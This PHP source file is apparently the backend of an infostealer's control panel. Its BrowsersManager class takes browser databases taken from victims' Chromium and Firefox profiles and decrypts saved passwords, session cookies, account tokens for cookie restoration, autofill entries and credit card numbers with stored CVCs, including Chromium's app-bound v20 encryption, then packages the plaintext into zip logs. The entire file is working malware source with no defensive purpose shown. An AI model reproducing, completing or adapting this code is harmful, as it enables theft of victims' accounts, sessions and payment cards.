<?php

class BrowsersManager
{
    private $markersManager;
    private $log;
    private $filename;
    private $file;
    private $connection;
    private $browser;
    private $zipManager;

    // ---------------------------------------------------------------------------------------
    // __construct
    //
    // class constructor
    // ---------------------------------------------------------------------------------------
    public function __construct($markersManager, $log, $filename, $file, $connection, $zipManager)
    {
        $this->markersManager = $markersManager;
        $this->log = $log;
        $this->filename = $filename;
        $this->file = $file;
        $this->connection = $connection;
        $this->zipManager = $zipManager;

        // get browsers list
        $buildsManager = new BuildsManager($this->connection);

        $browsers = $buildsManager->getBrowsers();

        // parsing request
        $parse_filename = explode("\\", $this->filename);

        if (is_array($browsers) && !empty($browsers))
        {
            foreach ($browsers as $browser)
            {
                if(strcmp($browser->name, $parse_filename[1]) == 0)
                {
                    $this->browser = $browser;
                    break;
                }
            }

            if(!empty($this->browser))
            {
                switch($this->browser->type)
                {
                    case 1:// chromium-based
                        $this->ChromiumBased($parse_filename);
                        break;

                    case 2:// opera-style
                        $this->ChromiumBased($parse_filename);
                        break;

                    case 3:// firefox-based
                        $this->FirefoxBased($parse_filename);
                        break;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ChromiumBased
    //
    // decrypt chromium-based browsers
    // ---------------------------------------------------------------------------------------
    public function ChromiumBased($parse_filename)
    {
        $temp_file = $this->CreateTempFile($this->file);

        if($temp_file != false)
        {
            $db = new SQLite3($temp_file);

            switch($parse_filename[3])
            {
                case "Login Data":
                    $this->ReadPasswords($db, $parse_filename);
                    break;

                case "Cookies":
                    $this->ReadCookies($db, $parse_filename);
                    break;

                case "Web Data":
                    $this->ReadAutofill($db, $parse_filename);
                    $this->ReadAccountTokens($db, $parse_filename);
                    $this->ReadCreditCards($db, $parse_filename);
                    break;

                case "History":
                    $this->ReadHistory($db, $parse_filename);
                    break;
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadPasswords
    //
    // read chromium passwords
    // ---------------------------------------------------------------------------------------
    public function ReadPasswords($db, $parse_filename)
    {
        if ($db)
        {
            $query = "SELECT origin_url, username_value, password_value FROM logins";
            $result = $db->query($query);

            if ($result)
            {
                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $password_value = $row['password_value'];
                    $decrypted = null;

                    switch (substr($password_value, 0, 3))
                    {
                        case 'v10': 
                            if(BrowsersManager::Chromium_DecryptV10($password_value, $this->log->decrypt_keys[$this->browser->name]["v10"], $decrypted))
                            {
                                if(strlen($decrypted) > 0)
                                {
                                    $line .= "browser: " . $this->browser->name ."\n";
                                    $line .= "profile: " . $parse_filename[2] ."\n";
                                    $line .= "url: " . $row['origin_url'] ."\n";
                                    $line .= "login: " . $row['username_value'] ."\n";
                                    $line .= "password: " . $decrypted ."\n\n";

                                    $this->log->count_passwords++;
                                    $this->log->log_info["browsers"][$this->browser->name]++;
                                }
                            }
                            break;
                    }
                }

                if(strlen($line) > 0)
                {
                    $this->log->array_passwords .= $line;
                    $this->zipManager->AddFile("passwords.txt", $line, false);

                    $this->markersManager->Scan($this->log, $line);
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadCookies
    //
    // read chromium cookies
    // ---------------------------------------------------------------------------------------
    public function ReadCookies($db, $parse_filename)
    {
        if ($db)
        {
            $query = "SELECT host_key, is_httponly, path, is_secure, expires_utc, name, encrypted_value from cookies";
            $result = $db->query($query);

            if ($result)
            {
                $app_bound_encrypted_key = "";

                if(!empty($this->log->decrypt_keys[$this->browser->name]["v20"]))
                {
                    $app_bound_encrypted_key = $this->Chromium_AppBoundKeyInit(base64_decode($this->log->decrypt_keys[$this->browser->name]["v20"]));
                }

                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $host_key = $row['host_key'];
                    $is_httponly = ($row['is_httponly'] == 0) ? "TRUE" : "FALSE";
                    $path = $row['path'];
                    $is_secure = ($row['is_secure'] == 0) ? "TRUE" : "FALSE";
                    $expires_utc = round(($row['expires_utc'] / 1000000) - 11644480800);
                    $name = $row['name'];
                    $encrypted_value = $row['encrypted_value'];
                    $decrypted = "";

                    switch (substr($encrypted_value, 0, 3))
                    {
                        case 'v10':
                            BrowsersManager::Chromium_DecryptV10($encrypted_value, $this->log->decrypt_keys[$this->browser->name]["v10"], $decrypted);
                            $decrypted = substr($decrypted, 32);
                            break;

                        case 'v20':
                            $decrypted = $this->Chromium_DecryptV20($encrypted_value, $app_bound_encrypted_key);
                            $decrypted = substr($decrypted, 32);
                            break;
                    }
                    
                    $line .= $host_key;
                    $line .= '	';
                    $line .= $is_httponly;
                    $line .= '	';
                    $line .= $path;
                    $line .= '	';
                    $line .= $is_secure;
                    $line .= '	';
                    $line .= $expires_utc;
                    $line .= '	';
                    $line .= $name;
                    $line .= '	';
                    $line .= $decrypted;
                    $line .= "\n";

                    if(!$this->checkDomainInList($host_key, $this->log->array_cookies))
                    {
                        $this->log->array_cookies .= $host_key ."\n";
                    }

                    $this->log->count_cookies++;
                }

                if(strlen($line) > 0)
                {
                    $_file = $this->browser->name ."_". $parse_filename[2] .".txt";
                    $_filename = "cookies\\". $_file;

                    $this->zipManager->AddFile($_filename, $line, false);

                    $this->log->log_info["cookies"][$_file]["name"] = $parse_filename[2];

                    if (!isset($this->log->log_info["cookies"][$_file]["size"])) 
                    {
                        $this->log->log_info["cookies"][$_file]["size"] = 0;
                    }
                    
                    $this->log->log_info["cookies"][$_file]["size"] += strlen($line) / 1000;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadHistory
    //
    // read chromium history
    // ---------------------------------------------------------------------------------------
    public function ReadHistory($db, $parse_filename)
    {
        if($db)
        {
            $query = "SELECT url FROM urls";
            $result = $db->query($query);

            if ($result)
            {
                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $url = $row['url'];

                    $line .= $url;
                    $line .= "\n";
                }

                if(strlen($line) > 0)
                {
                    $_file = $this->browser->name ."_". $parse_filename[2] .".txt";
                    $_filename = "history\\". $_file;

                    $this->zipManager->AddFile($_filename, $line, false);

                    $this->log->log_info["history"][$_file]["name"] = $parse_filename[2];

                    if (!isset($this->log->log_info["history"][$_file]["size"])) 
                    {
                        $this->log->log_info["history"][$_file]["size"] = 0;
                    }
                    
                    $this->log->log_info["history"][$_file]["size"] += strlen($line) / 1000;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadAutofill
    //
    // read chromium autofill
    // ---------------------------------------------------------------------------------------
    public function ReadAutofill($db, $parse_filename)
    {
        if($db)
        {
            $query = "SELECT name, value FROM autofill";
            $result = $db->query($query);

            if ($result)
            {
                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $line .= $row['name'];
                    $line .= '	';
                    $line .= $row['value'];
                    $line .= "\n";
                }

                if(strlen($line) > 0)
                {
                    $_file = $this->browser->name ."_". $parse_filename[2] .".txt";
                    $_filename = "autofill\\". $_file;

                    $this->zipManager->AddFile($_filename, $line, false);

                    $this->log->log_info["autofill"][$_file]["name"] = $parse_filename[2];

                    if (!isset($this->log->log_info["autofill"][$_file]["size"])) 
                    {
                        $this->log->log_info["autofill"][$_file]["size"] = 0;
                    }
                    
                    $this->log->log_info["autofill"][$_file]["size"] += strlen($line) / 1000;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadAccountTokens
    //
    // read chromium account tokens for cookies restore
    // ---------------------------------------------------------------------------------------
    public function ReadAccountTokens($db, $parse_filename)
    {
        if($db)
        {
            $query = "SELECT service, encrypted_token FROM token_service";
            $result = $db->query($query);

            if ($result)
            {
                $app_bound_encrypted_key = "";

                if(!empty($this->log->decrypt_keys[$this->browser->name]["v20"]))
                {
                    $app_bound_encrypted_key = $this->Chromium_AppBoundKeyInit(base64_decode($this->log->decrypt_keys[$this->browser->name]["v20"]));
                }

                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $_service = substr($row['service'], 10);
                    $_encrypted_token = $row['encrypted_token'];
                    $decrypted = "";

                    switch (substr($_encrypted_token, 0, 3))
                    {
                        case 'v10':
                            BrowsersManager::Chromium_DecryptV10($_encrypted_token, $this->log->decrypt_keys[$this->browser->name]["v10"], $decrypted);
                            break;

                        case 'v20':
                            $decrypted = $this->Chromium_DecryptV20($_encrypted_token, $app_bound_encrypted_key);
                            break;
                    }

                    $line .= $decrypted;
                    $line .= ':';
                    $line .= $_service;
                    $line .= "\n";
                }

                if(strlen($line) > 0)
                {
                    $_file = $this->browser->name ."_". $parse_filename[2] .".txt";
                    $_filename = "AccountTokens\\". $_file;

                    $this->zipManager->AddFile($_filename, $line, false);

                    $this->log->log_info["account_tokens"][$_file]["name"] = $parse_filename[2];

                    if (!isset($this->log->log_info["account_tokens"][$_file]["size"])) 
                    {
                        $this->log->log_info["account_tokens"][$_file]["size"] = 0;
                    }
                    
                    $this->log->log_info["account_tokens"][$_file]["size"] += strlen($line) / 1000;
                    $this->log->log_info["account_tokens"][$_file]["token"] = $line;
                    $this->log->log_info["account_tokens"][$_file]["browser"] = $this->browser->name;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadCreditCards
    //
    // read chromium credit cards
    // ---------------------------------------------------------------------------------------
    public function ReadCreditCards($db, $parse_filename)
    {
        if($db)
        {
            $query = "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards";
            $result = $db->query($query);

            if ($result)
            {
                $app_bound_encrypted_key = "";

                if(!empty($this->log->decrypt_keys[$this->browser->name]["v20"]))
                {
                    $app_bound_encrypted_key = $this->Chromium_AppBoundKeyInit(base64_decode($this->log->decrypt_keys[$this->browser->name]["v20"]));
                }

                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $guid                       = $row['guid'];
                    $local_stored_cvc           = "";

                    if(!empty($guid))
                    {
                        $stmt = $db->prepare('SELECT value_encrypted FROM local_stored_cvc WHERE guid = :guid');
                        $stmt->bindValue(':guid', $guid, SQLITE3_TEXT);

                        $guid_result = $stmt->execute();

                        while ($guid_row = $guid_result->fetchArray(SQLITE3_ASSOC))
                        {
                            $value_encrypted = $guid_row['value_encrypted'];

                            switch (substr($value_encrypted, 0, 3))
                            {
                                case 'v10':
                                    BrowsersManager::Chromium_DecryptV10($value_encrypted, $this->log->decrypt_keys[$this->browser->name]["v10"], $local_stored_cvc);
                                    break;

                                case 'v20':
                                    $local_stored_cvc = $this->Chromium_DecryptV20($value_encrypted, $app_bound_encrypted_key);
                                    break;
                            }
                        }
                    }

                    $name_on_card               = $row['name_on_card'];
                    $expiration_month           = $row['expiration_month'];
                    $expiration_year            = $row['expiration_year'];
                    $card_number_encrypted      = $row['card_number_encrypted'];
                    $decrypted                  = "";

                    switch (substr($card_number_encrypted, 0, 3))
                    {
                        case 'v10':
                            BrowsersManager::Chromium_DecryptV10($card_number_encrypted, $this->log->decrypt_keys[$this->browser->name]["v10"], $decrypted);
                            break;

                        case 'v20':
                            $decrypted = $this->Chromium_DecryptV20($card_number_encrypted, $app_bound_encrypted_key);
                            break;
                    }

                    $line .= "name: ";
                    $line .= $name_on_card;
                    $line .= "\n";
                    $line .= "month: ";
                    $line .= $expiration_month;
                    $line .= "\n";
                    $line .= "year: ";
                    $line .= $expiration_year;
                    $line .= "\n";
                    $line .= "card: ";
                    $line .= $decrypted;
                    $line .= "\n";
                    $line .= "cvc2: ";
                    $line .= $local_stored_cvc;
                    $line .= "\n\n";
                }

                if(strlen($line) > 0)
                {
                    $_file = $this->browser->name ."_". $parse_filename[2] .".txt";
                    $_filename = "cc\\". $_file;

                    $this->zipManager->AddFile($_filename, $line, false);

                    $this->log->log_info["cc"][$_file]["profile"] = $parse_filename[2];

                    if (!isset($this->log->log_info["cc"][$_file]["size"])) 
                    {
                        $this->log->log_info["cc"][$_file]["size"] = 0;
                    }
                    
                    $this->log->log_info["cc"][$_file]["size"] += strlen($line) / 1000;

                    $this->log->log_info["cc"][$_file]["browser"]           = $this->browser->name;
                    $this->log->log_info["cc"][$_file]["name_on_card"]      = $name_on_card;
                    $this->log->log_info["cc"][$_file]["expiration_month"]  = $expiration_month;
                    $this->log->log_info["cc"][$_file]["expiration_year"]   = $expiration_year;
                    $this->log->log_info["cc"][$_file]["card"]              = $decrypted;
                    $this->log->log_info["cc"][$_file]["cvc2"]              = $local_stored_cvc;

                    $this->log->count_cc++;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // FirefoxBased
    //
    // decrypt firefox-based browsers
    // ---------------------------------------------------------------------------------------
    public function FirefoxBased($parse_filename)
    {
        $temp_file = $this->CreateTempFile($this->file);

        if($temp_file != false)
        {
            $db = new SQLite3($temp_file);

            switch($parse_filename[3])
            {
                case "cookies.sqlite":
                    $this->ReadCookiesFirefox($db, $parse_filename);
                    break;

                case "formhistory.sqlite":
                    $this->ReadReadAutofillFirefox($db, $parse_filename);
                    break;

                case "places.sqlite":
                    $this->ReadHistoryFirefox($db, $parse_filename);
                    break;
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadCookiesFirefox
    //
    // read firefox cookies
    // ---------------------------------------------------------------------------------------
    public function ReadCookiesFirefox($db, $parse_filename)
    {
        if ($db)
        {
            $query = "SELECT host, isHttpOnly, path, isSecure, expiry, name, value FROM moz_cookies";
            $result = $db->query($query);

            if ($result)
            {
                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $line .= $row['host'];
                    $line .= '	';
                    $line .= $row['isHttpOnly'];
                    $line .= '	';
                    $line .= $row['path'];
                    $line .= '	';
                    $line .= $row['isSecure'];
                    $line .= '	';
                    $line .= $row['expiry'];
                    $line .= '	';
                    $line .= $row['name'];
                    $line .= '	';
                    $line .= $row['value'];
                    $line .= "\n";

                    if(!$this->checkDomainInList($row['host'], $this->log->array_cookies))
                    {
                        $this->log->array_cookies .= $row['host'] ."\n";
                    }

                    $this->log->array_cookies .= $row['host'] ."\n";
                    $this->log->count_cookies++;
                }

                if(strlen($line) > 0)
                {
                    $_file = $this->browser->name ."_". $parse_filename[2] .".txt";
                    $_filename = "cookies\\". $_file;

                    $this->zipManager->AddFile($_filename, $line, false);

                    $this->log->log_info["cookies"][$_file]["name"] = $parse_filename[2];

                    if (!isset($this->log->log_info["cookies"][$_file]["size"])) 
                    {
                        $this->log->log_info["cookies"][$_file]["size"] = 0;
                    }
                    
                    $this->log->log_info["cookies"][$_file]["size"] += strlen($line) / 1000;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadReadAutofillFirefox
    //
    // read firefox autofill
    // ---------------------------------------------------------------------------------------
    public function ReadReadAutofillFirefox($db, $parse_filename)
    {
        if($db)
        {
            $query = "SELECT fieldname, value FROM moz_formhistory";
            $result = $db->query($query);

            if ($result)
            {
                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $line .= $row['fieldname'];
                    $line .= '	';
                    $line .= $row['value'];
                    $line .= "\n";
                }

                if(strlen($line) > 0)
                {
                    $_file = $this->browser->name ."_". $parse_filename[2] .".txt";
                    $_filename = "autofill\\". $_file;

                    $this->zipManager->AddFile($_filename, $line, false);

                    $this->log->log_info["autofill"][$_file]["name"] = $parse_filename[2];

                    if (!isset($this->log->log_info["autofill"][$_file]["size"])) 
                    {
                        $this->log->log_info["autofill"][$_file]["size"] = 0;
                    }
                    
                    $this->log->log_info["autofill"][$_file]["size"] += strlen($line) / 1000;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // ReadHistoryFirefox
    //
    // read firefox history
    // ---------------------------------------------------------------------------------------
    public function ReadHistoryFirefox($db, $parse_filename)
    {
        if($db)
        {
            $query = "SELECT url FROM moz_places";
            $result = $db->query($query);

            if ($result)
            {
                $line = "";

                while ($row = $result->fetchArray(SQLITE3_ASSOC))
                {
                    $line .= $row['url'];
                    $line .= "\n";
                }

                if(strlen($line) > 0)
                {
                    $_file = $this->browser->name ."_". $parse_filename[2] .".txt";
                    $_filename = "history\\". $_file;

                    $this->zipManager->AddFile($_filename, $line, false);

                    $this->log->log_info["history"][$_file]["name"] = $parse_filename[2];

                    if (!isset($this->log->log_info["history"][$_file]["size"])) 
                    {
                        $this->log->log_info["history"][$_file]["size"] = 0;
                    }
                    
                    $this->log->log_info["history"][$_file]["size"] += strlen($line) / 1000;
                }
            }
        }
    }

    // ---------------------------------------------------------------------------------------
    // CreateTempFile
    //
    // create 
    // ---------------------------------------------------------------------------------------
    public function CreateTempFile($file)
    {
        $tempFilePath = tempnam(sys_get_temp_dir(), 'temp');

        $tempFile = fopen($tempFilePath, 'w+');

        if($tempFile)
        {
            fwrite($tempFile, $file);
            fclose($tempFile);

            return $tempFilePath;
        }
        else
        {
            return false;
        }
    }

    // ---------------------------------------------------------------------------------------
    // Chromium_DecryptV10
    //
    // decrypt v10 chromium algo 
    // ---------------------------------------------------------------------------------------
    public static function Chromium_DecryptV10($data, $key, &$result) 
    {
        $nonceSize = 12;
        $tagSize = 16;
        $dataSize = strlen($data);
        
        $nonce = substr($data, 3, $nonceSize);
        $tag = substr($data, $dataSize - $tagSize);
        $cipherText = substr($data, 3 + $nonceSize, $dataSize - 3 - $nonceSize - $tagSize);
        
        $plainText = openssl_decrypt($cipherText, 'aes-256-gcm', base64_decode($key), OPENSSL_RAW_DATA, $nonce, $tag);
        
        if ($plainText === false) 
        {
            $result = "?";
            return false;
        }
        
        $result = $plainText;
        return true;
    }

    // ---------------------------------------------------------------------------------------
    // Chromium_DecryptV20
    //
    // decrypt v20 chromium algo 
    // ---------------------------------------------------------------------------------------
    public function Chromium_DecryptV20($encryptedBlob, $key) 
    {
        try 
        {
            $ivSize = 12;
            $tagSize = 16;
            $encryptedBlobSize = strlen($encryptedBlob);
            $tagOffset = $encryptedBlobSize - 15;
    
            $iv = substr($encryptedBlob, 3, $ivSize);
            $cipherPass = substr($encryptedBlob, 15);
            
            $tagOffset = strlen($cipherPass) - $tagSize;
            $tag = substr($cipherPass, $tagOffset, $tagSize);
            $cipherText = substr($cipherPass, 0, $tagOffset);
    
            $plainText = openssl_decrypt($cipherText, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
    
            if ($plainText === false) 
            {
                return "?";
            }

            return $plainText;
        } 
        catch (Exception $e) 
        {
            return "?";
        }
    }

    // ---------------------------------------------------------------------------------------
    // Chromium_AppBoundKeyInit
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function Chromium_AppBoundKeyInit($hexString) 
    {
        if (strlen($hexString) >= 2 && $hexString[strlen($hexString) - 2] === ' ' && $hexString[strlen($hexString) - 1] === "\n") 
        {
            $hexString = substr($hexString, 0, -2);
        }
    
        if (strlen($hexString) % 2 !== 0) 
        {
            return false;
        }
    
        $numBytes = strlen($hexString) / 2;
    
        $dataBlob = [
            'cbData' => $numBytes,
            'pbData' => ''
        ];
    
        for ($i = 0; $i < $numBytes; ++$i) 
        {
            $byteString = substr($hexString, $i * 2, 2);
            $dataBlob['pbData'] .= chr(hexdec($byteString));
        }
    
        return $dataBlob['pbData'];
    }

    // ---------------------------------------------------------------------------------------
    // checkDomainInList
    //
    // 
    // ---------------------------------------------------------------------------------------
    public function checkDomainInList($domain, $domainList) 
    {
        $domains = explode("\n", $domainList);
    
        foreach ($domains as $existingDomain) 
        {
            $existingDomain = trim($existingDomain);

            if ($domain === $existingDomain || strpos($domain, '.' . $existingDomain) !== false) 
            {
                return true;
            }
    
            if ($existingDomain === $domain || strpos($existingDomain, '.' . $domain) !== false) 
            {
                return true;
            }
        }
        return false;
    }
}

?>